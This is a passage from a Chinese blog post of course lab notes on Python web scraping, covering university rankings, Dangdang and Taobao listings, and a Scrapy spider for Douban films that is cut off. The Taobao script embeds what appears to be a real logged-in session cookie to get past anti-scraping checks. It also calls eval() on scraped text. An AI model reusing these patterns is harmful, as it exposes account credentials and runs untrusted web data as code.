fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList(uinfo, <span class="number">20</span>)  <span class="comment"># 20 univs</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p>结果是不对齐的，这是因为当中文字符宽度不够时，采用西文字符填充；中西文字符占用宽度不同</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402162153169.png" alt="image-20200402162153169"></p>
<p>之后我们将printUnivList函数改成如下，排列对齐了</p>
<p>tplt为定义的输出格式模板变量：</p>
<ul>
<li>^代表居中</li>
<li>4/12/10代表输出宽度（当输出数据超过该数字时，以实际输出为准）</li>
<li>{3}代表打印输出时，我们使用chr(12288)中文空格对齐（全角Unicode空格）</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList_A</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402162058589.png" alt="image-20200402162058589"></p>
<h3 id="扩展1-url改为2017"><a href="#扩展1-url改为2017" class="headerlink" title="扩展1-url改为2017"></a>扩展1-url改为2017</h3><p>将实例2中url改为软科中国最好大学排名2017？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2017.html'</span></span><br></pre></td></tr></table></figure>

<p>会报错 <code>排名</code>找不到</p>
<p>我们将ulist打印出来，发现排名为none，说明没有获取到排名的值</p>
<p>而我在chrome上审查，2017和2016的排名处格式是相同的</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402164344702.png" alt="image-20200402164344702"></p>
<p>而在代码中使用<code>soup.prettify()</code>打印出来代码后发现排名处格式没有<code>&lt;td&gt;&lt;/td&gt;</code>的闭合，这里估计是用了javascript渲染时做了手脚使得td标签变了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">print(soup.prettify())</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402164103572.png" alt="image-20200402164103572"></p>
<p>由图上可知，第一个td标签包含了所有内容，包括排名，所以无法通过<code>tds[0]</code>找到</p>
<p>解决方案：</p>
<p>使用contends</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tds[<span class="number">0</span>].contents[<span class="number">0</span>]   <span class="comment">#这个就是排名了</span></span><br><span class="line">tds[<span class="number">0</span>].get_text(<span class="string">" "</span>).split(<span class="string">" "</span>)[<span class="number">0</span>]  <span class="comment">#这个也可以,get_text()清空所有html标签元素</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402183232902.png" alt="image-20200402183232902"></p>
<p>总代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span><span class="params">(ulist, html)</span>:</span></span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment"># print(soup.prettify())</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            <span class="comment"># tds[0].get_text(" ").split(" ")[0]也可以</span></span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].contents[<span class="number">0</span>], tds[<span class="number">1</span>].string, tds[<span class="number">3</span>].string])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivList_A</span><span class="params">(ulist, num)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(num):</span><br><span class="line">        u = ulist[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/zuihaodaxuepaiming2017.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    fillUnivList(uinfo, html)</span><br><span class="line">    printUnivList_A(uinfo, <span class="number">20</span>)  <span class="comment"># 20 univs</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3()</span><br></pre></td></tr></table></figure>

<p>最终结果</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402183419220.png" alt="image-20200402183419220"></p>
<h3 id="扩展2-url改为软科排名2016"><a href="#扩展2-url改为软科排名2016" class="headerlink" title="扩展2-url改为软科排名2016"></a>扩展2-url改为软科排名2016</h3><p>将实例2中url改为软科世界大学学术排名 2016：<a href="http://www.zuihaodaxue.cn/ARWU2016.html" target="_blank" rel="noopener">http://www.zuihaodaxue.cn/ARWU2016.html</a><br>该如何修改代码？</p>
<p>可以看到没有多大的变化，只是大学名、国家\地区有些不同    </p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402165756192.png" alt="image-20200402165756192"></p>
<p>对之前的代码稍加修改可得结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_3_2</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://www.zuihaodaxue.cn/ARWU2016.html'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">'tbody'</span>).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(tr, bs4.element.Tag):</span><br><span class="line">            tds = tr(<span class="string">'td'</span>)</span><br><span class="line">            uinfo.append([tds[<span class="number">0</span>].string, tds[<span class="number">1</span>].a.string, tds[<span class="number">3</span>].string])</span><br><span class="line">    tplt = <span class="string">"&#123;0:^4&#125;\t&#123;1:&#123;3&#125;^12&#125;\t&#123;2:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"学校名称"</span>, <span class="string">"总分"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        u = uinfo[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>], chr(<span class="number">12288</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    instance_3_2()</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402170840117.png" alt="image-20200402170840117"></p>
<h2 id="3-爬取当当图书排行榜（榜单自选）"><a href="#3-爬取当当图书排行榜（榜单自选）" class="headerlink" title="3.爬取当当图书排行榜（榜单自选）"></a>3.爬取当当图书排行榜（榜单自选）</h2><p>格式：爬取结果包含但不限于[排名 书名 作者]， 注意输出格式对齐。</p>
<p>我这里爬取 <code>信息安全</code>类书籍的销量排行榜</p>
<p><a href="http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1" target="_blank" rel="noopener">http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1</a></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402171057952.png" alt="image-20200402171057952"></p>
<p>可以看到<code>html</code>结构如下</p>
<p>先从<code>class</code>为<code>bang_list clearfix bang_list_mode</code>中的<code>ul</code>遍历<code>li</code></p>
<p>再从<code>li</code>中找出</p>
<ul>
<li>排名</li>
<li>名字</li>
<li>现在的价格</li>
<li>之前的价格</li>
<li>链接</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402171331034.png" alt="image-20200402171331034"></p>
<p>代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">instance_4</span><span class="params">()</span>:</span></span><br><span class="line">    uinfo = []</span><br><span class="line">    url = <span class="string">'http://bang.dangdang.com/books/bestsellers/01.54.19.00.00.00-24hours-0-0-1-1'</span></span><br><span class="line">    html = getHTMLText(url)</span><br><span class="line">    soup = BeautifulSoup(html, <span class="string">"html.parser"</span>)</span><br><span class="line">    <span class="comment"># print(soup.prettify())</span></span><br><span class="line">    <span class="keyword">for</span> li <span class="keyword">in</span> soup.find(<span class="string">'ul'</span>,attrs=&#123;<span class="string">"class"</span>:re.compile(<span class="string">'bang_list clearfix bang_list_mode'</span>)&#125;).children:</span><br><span class="line">        <span class="keyword">if</span> isinstance(li, bs4.element.Tag):</span><br><span class="line">            div_array = li(<span class="string">'div'</span>)</span><br><span class="line">            rank=div_array[<span class="number">0</span>].string</span><br><span class="line">            name=div_array[<span class="number">1</span>].a.img.attrs[<span class="string">'title'</span>]</span><br><span class="line">            price_n=div_array[<span class="number">6</span>].p.contents[<span class="number">1</span>].string</span><br><span class="line">            prince_before=div_array[<span class="number">6</span>].p.contents[<span class="number">3</span>].string</span><br><span class="line">            url=div_array[<span class="number">1</span>].a.attrs[<span class="string">'href'</span>]</span><br><span class="line">            uinfo.append([rank,name,price_n,prince_before,url])</span><br><span class="line">    tplt = <span class="string">"&#123;0:^3&#125;\t&#123;1:&#123;5&#125;^15&#125;\t&#123;2:^5&#125;\t&#123;3:^5&#125;\t&#123;4:^10&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"排名"</span>, <span class="string">"书名"</span>, <span class="string">"之前的价格"</span>,<span class="string">"当前价格"</span>,<span class="string">"URL"</span>, chr(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">        u = uinfo[i]</span><br><span class="line">        print(tplt.format(u[<span class="number">0</span>], u[<span class="number">1</span>], u[<span class="number">2</span>],u[<span class="number">3</span>],u[<span class="number">4</span>],chr(<span class="number">12288</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    instance_4()</span><br></pre></td></tr></table></figure>

<p>结果如下！！！</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402175720833.png" alt="image-20200402175720833"></p>
<h1 id="实验2-1-正则式"><a href="#实验2-1-正则式" class="headerlink" title="实验2.1-正则式"></a>实验2.1-正则式</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>正则表达式（Regular Expression，简写为regex或RE），使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402184401030.png" alt="image-20200402184401030"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402200458302.png" alt="image-20200402200458302"></p>
<p>re库主要的方法如下</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204550930.png" alt="image-20200402204550930"></p>
<p>match对象包含了关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息。</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204649960.png" alt="image-20200402204649960"></p>
<p>只要长度输出可能不同的，都可以通过在操作符后增加?变成最小匹配</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402204939305.png" alt="image-20200402204939305"></p>
<h2 id="尝试爬取淘宝商品的数据"><a href="#尝试爬取淘宝商品的数据" class="headerlink" title="尝试爬取淘宝商品的数据"></a>尝试爬取淘宝商品的数据</h2><ul>
<li><p>扫码登陆淘宝</p>
</li>
<li><p>搜索某个商品</p>
</li>
<li><p>发现商品分页的规律——如下，</p>
<p>第1页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=0</code></p>
<p>第2页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=44</code></p>
<p>第3页<code>https://s.taobao.com/search</code> <code>?q=airpodspro</code> <code>&amp;s=88</code></p>
<p>可以看出每页的s都是44累加的，这样我们想要遍历分页只需要遍历s即可</p>
</li>
</ul>
<p>由于淘宝有反爬虫机制，我们要将手动登陆后的Cookies、agent复制到header中</p>
<ul>
<li>扫码登陆淘宝</li>
<li>搜索商品，Chrome  下 F12打开审查</li>
<li>点击Network-&gt;Doc类型-&gt;search……-&gt;复制cookie、user-agent</li>
<li>将cookie、user-agent放到请求中，具体方式看代码</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402215404788.png" alt="image-20200402215404788"></p>
<p>编写程序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># AFAEF728105FFA95263125A9E0A097DC</span></span><br><span class="line">        hd = &#123;<span class="string">'cookie'</span>: <span class="string">'t=31555440a71b4d3ae330f044081146f9; cna=eaagFpxdLAUCAdrFmScIIYcw; thw=cn; cookie2=1bdfd953450db1890a4960bafedf8169; v=0; _tb_token_=eefe396e49733; _samesite_flag_=true; sgcookie=Edo1lgxwoK2bRfYVahZOe; unb=2522367083; uc3=lg2=UIHiLt3xD8xYTw%3D%3D&amp;id2=UU2w7Hb9dvcsIQ%3D%3D&amp;nk2=tw%2F9XZuWLTE%3D&amp;vt3=F8dBxdAW4LSdjQGNkyg%3D; csg=dbe09bde; lgc=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; cookie17=UU2w7Hb9dvcsIQ%3D%3D; dnk=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; skt=d262960506d154ef; existShop=MTU4NTgzMjY2OQ%3D%3D; uc4=nk4=0%40tXwweg7zi7bxIxNwomsc8lmKSw%3D%3D&amp;id4=0%40U2%2F32UM%2BC1YLt9wuKmGuJsNzMVo7; tracknick=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; _cc_=VT5L2FSpdA%3D%3D; _l_g_=Ug%3D%3D; sg=%E5%A5%873f; _nk_=%5Cu518D%5Cu89C1%5Cu795E%5Cu5947; cookie1=AHnU1YHbYbkYLGQxilkANOpn3Y133DLACku%2BjBXRjNk%3D; enc=q3Gwz15Bq6QwoLkeceXsesqtD8wfeR5rLdWz%2BffQweZA9DT9jrnDbu8nmeCLcdc0X%2BE9JypMae6noiYZzph68g%3D%3D; tfstk=cEPhBo_vJJkCDiI_-HGQy2BO73GhalBEA7Pa_WoWKw4ovdFZ8sDJQKWBJNmLx7p5.; mt=ci=113_1; uc1=cookie16=URm48syIJ1yk0MX2J7mAAEhTuw%3D%3D&amp;cookie21=VFC%2FuZ9aiKCaj7AzMHh1&amp;cookie15=Vq8l%2BKCLz3%2F65A%3D%3D&amp;existShop=false&amp;pas=0&amp;cookie14=UoTUP2oWHktHHQ%3D%3D; l=dBEymxamQbBz3b0YBOfgqDezDdbOXBRflsPr9GLh3IB19u53HdBqEHweIlleI3QQEt134eKrjGibiRQeC3fRwxDDB3h2q_5xnxf..; isg=BIOD_uxF2W-mR5UgKRuxH2xxEkct-Bc6Bw5VXrVg3-JZdKOWPcinimHi7gQ6VG8y'</span></span><br><span class="line">              ,<span class="string">'user-agent'</span>: <span class="string">'Mozilla/5.0'</span>&#125;</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>,headers=hd)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parsePage</span><span class="params">(ilt, html)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        plt = re.findall(<span class="string">r'\"view_price\"\:\"[\d\.]*\"'</span>, html) <span class="comment">#匹配价格</span></span><br><span class="line">        tlt = re.findall(<span class="string">r'\"raw_title\"\:\".*?\"'</span>, html)  <span class="comment">#匹配标题</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plt)):</span><br><span class="line">            price = eval(plt[i].split(<span class="string">':'</span>)[<span class="number">1</span>])  <span class="comment">#对搜索结果进行分割，以“：”为分割点</span></span><br><span class="line">            title = eval(tlt[i].split(<span class="string">':'</span>)[<span class="number">1</span>])  <span class="comment">#eval将字符串当成有效的表达式来求值并返回计算结果</span></span><br><span class="line">            ilt.append([price, title])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printGoodsList</span><span class="params">(ilt)</span>:</span></span><br><span class="line">    tplt = <span class="string">"&#123;:4&#125;\t&#123;:8&#125;\t&#123;:16&#125;"</span></span><br><span class="line">    print(tplt.format(<span class="string">"序号"</span>, <span class="string">"价格"</span>, <span class="string">"商品名称"</span>))</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> ilt:</span><br><span class="line">        count = count + <span class="number">1</span></span><br><span class="line">        <span class="comment"># print((tplt.format(count, g[0], g[1])+"\n"))</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">"taobao-airpods pro.txt"</span>, <span class="string">"a+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write((tplt.format(count, g[<span class="number">0</span>], g[<span class="number">1</span>])+<span class="string">"\n"</span>)) <span class="comment"># 这句话自带文件关闭功能，不需要再写f.close()</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    goods = <span class="string">'airpodspro'</span></span><br><span class="line">    depth = <span class="number">100</span></span><br><span class="line">    start_url = <span class="string">'https://s.taobao.com/search?q='</span> + goods</span><br><span class="line">    infoList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(depth):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = start_url + <span class="string">'&amp;s='</span> + str(<span class="number">44</span> * i)</span><br><span class="line">            html = getHTMLText(url)</span><br><span class="line">            <span class="comment"># print(html)</span></span><br><span class="line">            parsePage(infoList, html)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    printGoodsList(infoList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>功能说明：</p>
<ul>
<li><code>main()</code>主程序用于遍历商品页输出</li>
<li><code>getHTMLText()</code>用于获得html</li>
<li><code>parsePage()</code>用正则式搜索商品名称和价格</li>
<li><code>printGoodsList()</code> 用于向命令行输出</li>
</ul>
<p>这里写入txt——用python向txt文件中写数据时的追加和覆盖，我们使用a+</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"test.txt"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"这是个测试！"</span>) <span class="comment">#这句话自带文件关闭功能，不需要再写f.close()</span></span><br><span class="line">r：以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</span><br><span class="line">r+：打开一个文件用于读写。文件指针将会放在文件的开头。 </span><br><span class="line">w：打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</span><br><span class="line">w+：打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</span><br><span class="line">a：打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</span><br><span class="line">a+：打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</span><br></pre></td></tr></table></figure>

<p>我爬取的是airpodspro的相关信息，爬取100页，具体的数据会存储到txt中</p>
<p>运行程序，成功</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402213933616.png" alt="image-20200402213933616"></p>
<p>爬取的过程中出现了编码问题</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">UnicodeEncodeError: <span class="string">'gbk'</span> codec can<span class="string">'t encode character '</span>\xae<span class="string">' in position 17: illegal multibyte sequence</span></span><br></pre></td></tr></table></figure>

<p>处理一下exception就好了</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222101748.png" alt="image-20200402222101748"></p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402223510719.png" alt="image-20200402223510719"></p>
<h1 id="实验2-2-用srapy框架爬取任意网站的内容"><a href="#实验2-2-用srapy框架爬取任意网站的内容" class="headerlink" title="实验2.2-用srapy框架爬取任意网站的内容"></a>实验2.2-用srapy框架爬取任意网站的内容</h1><p>要求：（不少于50条）</p>
<h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1-Scrapy与request"><a href="#1-Scrapy与request" class="headerlink" title="1.Scrapy与request"></a>1.Scrapy与request</h3><ul>
<li>相同点：两者都可以进行页面请求和爬取，Python爬虫的两个重要技术路线两者可用性都好，文档丰富，入门简单两者都没有处理js、提交表单、应对验证码等功能（可扩展）</li>
<li>不同点：<ul>
<li>Requests 页面级爬虫，功能库，并发性考虑不足，性能较差，重点在于页面下载。定制灵活，上手十分简单 。</li>
<li>Scrapy<br>网站级爬虫 框架，并发性好，性能较高， 重点在于爬虫结构。 一般定制灵活，深度定制困难， 入门稍难。</li>
</ul>
</li>
</ul>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222443363.png" alt="image-20200402222443363"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Engine从Spider处获得爬取请求(Request)</span><br><span class="line">Engine将爬取请求转发给Scheduler，用于调度</span><br><span class="line">Engine从Scheduler处获得下一个要爬取的请求</span><br><span class="line">Engine将爬取请求通过中间件发送给Downloader</span><br><span class="line">爬取网页后，Downloader形成响应（Response）通过中间件发给Engine</span><br><span class="line">Engine将收到的响应通过中间件发送给Spider处理 </span><br><span class="line">Spider处理响应后产生爬取项（scraped Item）和新的爬取请求（Requests）给Engine</span><br><span class="line">Engine将爬取项发送给Item Pipeline（框架出口）</span><br><span class="line">Engine将爬取请求发送给Scheduler</span><br></pre></td></tr></table></figure>

<h3 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h3><ul>
<li><p>安装lxml： pip install lxml</p>
</li>
<li><p>下载对应版本的Twisted</p>
<p>我下面的方法没成功，是在pycharm下下载的</p>
<p>%%%%%%%%%%%%%%%%%%%%</p>
<p>++++++++++++++++++++++++</p>
<p>​       <a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted</a> </p>
<p>​        <img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402222827956.png" alt="image-20200402222827956"></p>
<p>​       pip3 install C:\Users\78290\Desktop\Twisted-20.3.0-cp38-cp38-win_amd64.whl</p>
<p>​        (下载好的twisted模块的whl文件路径)</p>
<p>​    %%%%%%%%%%%%%%%%%%</p>
</li>
<li><p>安装scrapy：pip install scrapy</p>
</li>
<li><p>安装关联模块pypiwin32：pip install pypiwin32 </p>
</li>
</ul>
<h3 id="3-创建一个scrapy"><a href="#3-创建一个scrapy" class="headerlink" title="3.创建一个scrapy"></a>3.创建一个scrapy</h3><p>Scrapy常用命令</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402224714359.png" alt="image-20200402224714359"></p>
<p>1.创建项目：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy startproject tutorial</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402225249765.png" alt="image-20200402225249765"></p>
<p>2.定义Item</p>
<p>编辑 tutorial 目录中的 items.py 文件:</p>
<p>3.编写spider </p>
<p>Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。其包含了一个用于下载的初始URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。<br>为了创建一个Spider，必须继承 scrapy.Spider 类， 且定义三个属性：</p>
<ul>
<li>name: 用于区别Spider。 该名字必须是唯一的，不可以为不同的Spider设定相同的名字。</li>
<li>start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。</li>
<li>parse() 是spider的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在项目中生成 spider 文件的两种方法:</span><br><span class="line">命令行输入 Scrapy genspider domain domain.com</span><br><span class="line">tutorial&#x2F;spiders&#x2F;目录下创建domain.py</span><br></pre></td></tr></table></figure>

<p>4.执行spider</p>
<p>进入项目的根目录，执行下列命令启动spider    </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">scrapy crawl w3school</span><br></pre></td></tr></table></figure>

<p>5.提取item</p>
<p>scrapy支持如下库</p>
<ul>
<li>Beautiful Soup</li>
<li>Lxml</li>
<li>Re</li>
<li>Xpath</li>
<li>CSS</li>
</ul>
<h2 id="豆瓣电影-top250"><a href="#豆瓣电影-top250" class="headerlink" title="豆瓣电影 top250"></a>豆瓣电影 top250</h2><p>创建项目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scrapy genspider douban_movie &quot;douban_movie.com&quot;</span><br></pre></td></tr></table></figure>

<p>进入spider新建spider</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd douban</span><br><span class="line">cd douban</span><br><span class="line">scrapy crawl douban_movie</span><br></pre></td></tr></table></figure>

<p>项目结构</p>
<p><img src="/2020/03/25/2020-03-25-information-security-exp-1/image-20200402235349247.png" alt="image-20200402235349247"></p>
<p>代码如下</p>
<p>douban_movie.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> douban.items <span class="keyword">import</span> DoubanItem</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DoubanMovieSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">'douban_movie'</span></span><br><span class="line">    allowed_domains = [<span class="string">'movie.douban.com'</span>]</span><br><span class="line">    start_urls = [<span class="string">'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start=0&amp;limit=20'</span>]</span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        item = DoubanItem()</span><br><span class="line">        content_list = json.loads(response.body.decode())</span><br><span class="line">        <span class="keyword">if</span> (content_list == []):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">for</span> content <span class="keyword">in</span> content_list:</span><br><span class="line">            item[<span class="string">'title'</span>] = content[<span class="string">'title'</span>]</span><br><span class="line">            item[<span class="string">'url'</span>] = content[<span class="string">'url'</span>]</span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        self.offset += <span class="number">20</span> <span class="comment">#拼接分页请求链接</span></span><br><span class="line">        url = <span class="string">'https://movie.douban.com/j/chart/top_list?type=11&amp;interval_id=100%3A90&amp;action=&amp;start='</span>+str(self.offset) + <span 